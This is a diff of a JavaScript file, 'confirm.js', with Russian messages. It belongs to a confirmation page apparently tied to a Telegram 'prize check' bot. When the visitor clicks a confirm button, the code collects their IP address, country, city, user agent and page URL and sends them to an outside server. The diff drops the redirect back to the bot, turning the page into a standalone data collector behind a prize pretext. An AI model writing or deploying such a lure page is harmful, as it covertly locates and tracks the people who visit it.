@@ -1,12 +1,18 @@
+// confirm.js (готовый)
 const SERVER_BASE = "https://uwezertgithubio-production.up.railway.app";
-const ENDPOINT = SERVER_BASE + "/confirm";
+const ENDPOINT = SERVER_BASE.replace(/\/$/, "") + "/confirm";
 
-
-const BOT_USERNAME = "Check_prizebot"; 
+function uuidFallback() {
+  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
+    const r = (Math.random() * 16) | 0;
+    const v = c === "x" ? r : (r & 0x3) | 0x8;
+    return v.toString(16);
+  });
+}
 
 function getUidFromUrl() {
-  const p = new URLSearchParams(window.location.search);
-  return (p.get("uid") || "").trim();
+  const p = new URLSearchParams(location.search);
+  return p.get("uid");
 }
 
 async function getIpData() {
@@ -19,29 +25,15 @@ async function getIpData() {
   }
 }
 
-function deepLinkConfirm(uid, cc) {
-  const country = (cc || "ZZ").toUpperCase().slice(0, 2);
-  // start param: confirm_<uid>_<CC>
-  return `https://t.me/${BOT_USERNAME}?start=confirm_${uid}_${country}`;
-}
-
 async function sendConfirm() {
   const btn = document.getElementById("confirmBtn");
   const statusEl = document.getElementById("statusText");
 
   btn.classList.remove("error", "success");
-
-  const uid = getUidFromUrl();
-  if (!uid) {
-    btn.classList.add("error");
-    statusEl.textContent = "❌ Ошибка: в ссылке нет uid. Вернись в бота и нажми кнопку заново.";
-    return;
-  }
-
   statusEl.textContent = "Собираем данные…";
 
+  const uid = getUidFromUrl() || (crypto?.randomUUID?.() || uuidFallback());
   const ipData = await getIpData();
-  const cc = (ipData?.country_code || "ZZ").toUpperCase();
 
   const payload = {
     uid,
@@ -51,7 +43,7 @@ async function sendConfirm() {
     userAgent: navigator.userAgent,
     ip: ipData?.ip || "unknown",
     country: ipData?.country_name || ipData?.country || "unknown",
-    country_code: cc,
+    country_code: (ipData?.country_code || "unknown").toString(),
     city: ipData?.city || "unknown",
     page: location.href,
   };
@@ -71,7 +63,7 @@ async function sendConfirm() {
 
     if (!resp.ok) {
       btn.classList.add("error");
-      statusEl.textContent = `Ошибка сервера: ${resp.status}. Подробности в консоли.`;
+      statusEl.textContent = `Ошибка сервера: ${resp.status}.`;
       console.log("SERVER_STATUS:", resp.status);
       console.log("SERVER_BODY:", text);
       return;
@@ -85,22 +77,16 @@ async function sendConfirm() {
     }
 
     btn.classList.add("success");
-    statusEl.textContent = "✅ Готово! Сейчас вернём вас в бота…";
-
-    setTimeout(() => {
-      window.location.href = deepLinkConfirm(uid, cc);
-    }, 700);
-
+    statusEl.textContent = "✅ Готово! Данные отправлены.";
   } catch (e) {
     btn.classList.add("error");
-    statusEl.textContent = "❌ Ошибка сети (браузер не смог обратиться к серверу). Подробности в консоли.";
+    statusEl.textContent = "❌ Ошибка сети. Подробности в консоли.";
     console.log("NETWORK_ERROR:", e);
   }
 }
 
 document.addEventListener("DOMContentLoaded", () => {
-  const btn = document.getElementById("confirmBtn");
-  btn.addEventListener("click", (e) => {
+  document.getElementById("confirmBtn")?.addEventListener("click", (e) => {
     e.preventDefault();
     sendConfirm();
   });
